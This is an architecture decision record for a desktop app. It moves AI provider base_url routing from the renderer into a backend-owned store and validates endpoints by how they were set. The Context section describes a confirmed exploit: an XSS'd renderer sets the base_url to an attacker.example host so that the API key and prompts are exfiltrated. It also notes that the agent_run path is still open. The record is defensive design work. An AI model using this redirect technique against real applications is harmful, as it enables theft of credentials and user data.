---
status: accepted
---

# AI provider base_url provenance, not IP-filtering

## Context

Generation routing (which provider, which model, which endpoint) was renderer-owned: the Zustand `preferences.aiProviderConfig` slice held `{ activeProvider, providers: { [id]: { model, baseUrl } } }`, and `useGenerateConfig()` injected `provider`/`model`/`baseUrl` into every generation IPC call (`AiGenerateRequest`). The backend **trusted** `req.base_url` and used it to build the outbound request for `openai-compatible` providers.

**Confirmed exploit (HIGH/CRITICAL):** `ai_generate` resolved `req.base_url` and POSTed to `{base_url}/chat/completions` via `net::http::shared()` with `bearer_auth(api_key)` — a path with no `net::ssrf` guard. An XSS'd renderer setting `provider=openai-compatible, base_url=https://attacker.example/` would exfiltrate the stored API key plus the full prompt on every call, invisibly. A worse variant: `extension_bridge_set_ai_assist_enabled(..., base_url)` **persisted** a renderer-supplied base_url to disk, so a one-time XSS redirected every _future_ bridge-triggered generation until the opt-in was re-toggled.

The same renderer snapshot was threaded three times — generate/research requests, the extension-bridge `AiAssistConfig` (see [ADR 0011](0011-extension-ai-assist-optin.md)), and Autopilot's `assistant_provider/model/base_url` — each an independent copy of the same trust bug.

A wholesale fix by rejecting loopback/private IPs (the same posture as `net::ssrf::is_safe_ip`, used for outbound scrape/redirect targets) is **not viable here**: local AI gateways are a legitimate, common configuration — Ollama (`http://127.0.0.1:11434`), LM Studio, an on-prem vLLM — and the CSP already carves out exactly this egress (`docs/knowledge/security-rules.md`: "local AI egress is limited to Ollama (`127.0.0.1:11434`)"). IP-filtering the base_url would break every local-model user.

## Decision

Move base_url (and provider/model routing) ownership to a new backend-owned `AiConfigStore` (SQLite, `apps/desktop/src-tauri/src/ai_config/mod.rs`) — the **sole source of truth** for active generation routing. Generation commands resolve routing server-side via `Completer::from_active(app)` (`pipeline/mod.rs`), which reads the store, never the request.

**Provenance, not IP-filtering**, is the validation model: a base_url is trustworthy because of _how it got there_ (an explicit user action in Settings, write-validated at that moment), not because of _what host it points to_. `net::ssrf::validate_provider_base_url` (`net/ssrf.rs`) enforces only:

1. scheme must be `http`/`https`;
2. the host must not be the cloud-metadata address `169.254.169.254` (in any IPv4 notation the `url` crate normalizes to dotted-decimal — IPv6-mapped/ULA forms are **not** covered; this check is defense-in-depth, not the real boundary, since the real boundary is that the renderer no longer controls this value on the flipped commands, and IMDS is a GET-only credential source, not a POST sink).

Loopback and LAN addresses are deliberately **not** rejected — `validate_provider_base_url`'s doc comment states this explicitly, distinguishing it from the stricter `is_safe_ip`/`is_safe_public_host` used for scrape/redirect targets, which do reject private ranges. base_url is honored only for `ProviderId::OpenAiCompatible`; `AiConfigStore::validate_settings`/`scrub_settings` drop it to `NULL` for every other provider (a native provider's base_url is inert for egress but was still reaching `record_usage`'s cost-classification gate).

**Where provenance is enforced:**

- Write path: `ai_set_provider_settings`/`ai_set_active_provider` (`commands/ai.rs`) call the store's writers, which validate server-side (`ProviderId::parse` → cross-family model check → `validate_provider_base_url`) — a hard error surfaced to the user in Settings.
- Seed path: the one-time renderer→backend migration (`ai_active_config`'s `seedActiveConfig`) runs the same check leniently (`scrub_settings` drops a bad value instead of failing first run — a malicious pre-migration value must never persist as a live egress endpoint).
- Read/egress path: `Completer::from_active` **defensively re-validates** the stored base_url before use — this only ever fires on a tampered store (fail closed, never silently fall back to a default endpoint).
- Inspection commands (`ai_test_provider_key`, `ai_list_provider_models`, `ai_model_capabilities`) keep an explicit `provider`/`baseUrl` **request** parameter — they are Settings "test before save" calls against an in-progress, not-yet-persisted endpoint, not the generation/SSRF surface this ADR closes.

**Compile-time lock:** `provider`/`baseUrl` were removed from `AiGenerateRequest` in both `apps/desktop/src-tauri/src/ipc_contracts/ai.rs` and `packages/shared/src/schemas/index.ts` (`AiGenerateRequestSchema`) in the same change — removing the field is the strongest guarantee a caller can no longer supply it.

**Scope — closed for the flipped commands only:** `ai_generate`, `generate_pipeline`, research/salary (`ai_research_company`, `ai_research_answer`, `ai_lookup_salary`), the extension bridge's `resolve_answer_assist`, and autopilot's assistant-notes generation all resolve via `Completer::from_active` and no longer accept a request/record base_url. **`agent_run`** (`commands/agent.rs` → `run_agent_live`, the "prep this application" agent-loop path) is **not yet flipped** — it still resolves via `Completer::resolve(..., req.base_url)` with the renderer-supplied `base_url` threaded into `agent::tools::ToolContext` for tool calls (e.g. `research_company`). This is a tracked follow-up ([`docs/NEXT_ISSUES.md` #5](../NEXT_ISSUES.md)), not something this ADR claims to have closed — the SSRF/key-exfil path is **not** closed for `agent_run` today.

**Accepted behavior change (Autopilot):** a scheduled/headless autopilot run now follows the **currently-active** provider at run time, not the one pinned when the schedule/record was created (the old `assistant_provider/model/base_url` per-record snapshot is gone). Owner-signed-off; documented in `docs/knowledge/automation-domain.md`.

## Considered options

1. **Backend-owned store, provenance-validated (chosen).** Closes the trust boundary at the source (the renderer can no longer supply routing per-call) while preserving legitimate local/LAN gateways. Cost: a migration/seed step, and a renderer-wide flip of every call site that used to pass `provider`/`baseUrl`.
2. **Keep renderer-supplied base_url, add wholesale IP-filtering (reject loopback/private/LAN).** Rejected: breaks Ollama, LM Studio, and any on-prem OpenAI-compatible gateway — the exact traffic the CSP's Ollama exception already sanctions. Also does nothing about _provenance_ — a same-machine XSS can still supply a public attacker URL, which IP-filtering would let straight through.
3. **Keep per-call renderer-supplied base_url, just add stronger CSP.** Rejected: CSP governs the renderer's own `fetch`/WebView network stack, not the Rust backend's `net::http::shared()` egress — it cannot constrain what URL a Tauri command sends a request to.
4. **A combined switch+edit setter (one command for "pick provider" and "edit its settings").** Rejected: collapses two distinct user actions — switching the active provider must never be a side effect of editing one provider's model/base_url, or a routine settings edit could silently flip which provider handles the next generation.
5. **Move `effort`/`modelLimits` into the same backend store.** Rejected (deferred): these are generation-tuning/prompt-shaping knobs (CLI reasoning effort; Ollama context window/max tokens/temperature), not routing or an SSRF surface — they stay renderer-side, per-call, as before.

## Consequences

- **`AiConfigStore` is now managed Tauri state**, wired into the `Resettable` full-reset registry (`commands/privacy.rs`) and the backup allowlist (`commands/data.rs::build_bundle`) — it holds no secrets (API keys stay in the OS keychain), so backing it up is safe, but a factory reset must clear it.
- **An unseeded store has no active provider** — generation errors "No AI provider selected" rather than silently defaulting, matching the app's no-silent-fallback invariant.
- **The renderer's `useGenerateConfig`/`useActiveConfig`** (`services/use-ai-provider.ts`) reads routing from the backend via React Query; cold boot has an `isPending` window that gates every consuming UI (Settings, autopilot wizard steps, the model selector, status bar) so a not-yet-loaded config never flashes a false "no provider configured" state.
- **`extension_bridge_set_ai_assist_enabled` is now a bare boolean** — the bridge no longer snapshots or persists provider/model/base_url; the billable-consent gate from [ADR 0011](0011-extension-ai-assist-optin.md) is unchanged, but the provider-snapshot mechanism that ADR introduced is retired in favor of live resolution from this shared store.
- **`agent_run` remains on the old, request-trusting path** — a real, tracked gap. Any claim that "all generation is backend-routed" is false until [`docs/NEXT_ISSUES.md` #5](../NEXT_ISSUES.md) lands.
- **`AgentRunRequestSchema`** (`packages/shared/src/schemas/index.ts`) still carries `provider`/`model`/`baseUrl` — matching, not contradicting, the scope above.

## References

- Store: `apps/desktop/src-tauri/src/ai_config/mod.rs` (`AiConfigStore`, `ActiveAiConfig`, `ProviderConfig`, `validate_settings`, `scrub_settings`, `seed_if_empty`).
- Provenance guard: `apps/desktop/src-tauri/src/net/ssrf.rs` (`validate_provider_base_url`, `CLOUD_METADATA_IPV4`) — distinct from the stricter `is_safe_ip`/`is_safe_public_host` used for scrape/redirect egress.
- Resolver: `apps/desktop/src-tauri/src/pipeline/mod.rs` (`Completer::from_active`, `Completer::resolve`).
- Commands: `apps/desktop/src-tauri/src/commands/ai.rs` (`ai_active_config`, `ai_set_active_provider`, `ai_set_provider_settings`, `ai_research_company`), `apps/desktop/src-tauri/src/commands/autopilot.rs` (assistant-notes resolution).
- Extension bridge: `apps/desktop/src-tauri/src/extension_bridge/answer_assist.rs` (`resolve_answer_assist`), `apps/desktop/src-tauri/src/extension_bridge/mod.rs` (`ai_assist_enabled: AtomicBool`).
- Shared contracts: `packages/shared/src/schemas/index.ts` (`AiGenerateRequestSchema`, `AgentRunRequestSchema`), `packages/shared/src/ipc/contracts/ai.ts` (`ActiveAiConfig`, `AiConfigSnapshot`, `AiProviderRouting`).
- Renderer: `apps/desktop/src/renderer/services/use-ai-provider.ts` (`useActiveConfig`, `useSetActiveProvider`, `useSetProviderSettings`), `apps/desktop/src/renderer/providers/AiConfigBoot` (boot prefetch + one-time seed).
- CSP local-AI exception: `docs/knowledge/security-rules.md` ("local AI egress is limited to Ollama (`127.0.0.1:11434`)").
- Follow-up: [`docs/NEXT_ISSUES.md` #5](../NEXT_ISSUES.md) (flip `agent_run` off a request-supplied `base_url`).
- Related: [ADR 0011](0011-extension-ai-assist-optin.md) (the AI-assist opt-in gate this retires the provider snapshot from), [ADR 0005](0005-network-egress-privacy-boundary.md) (egress classes).
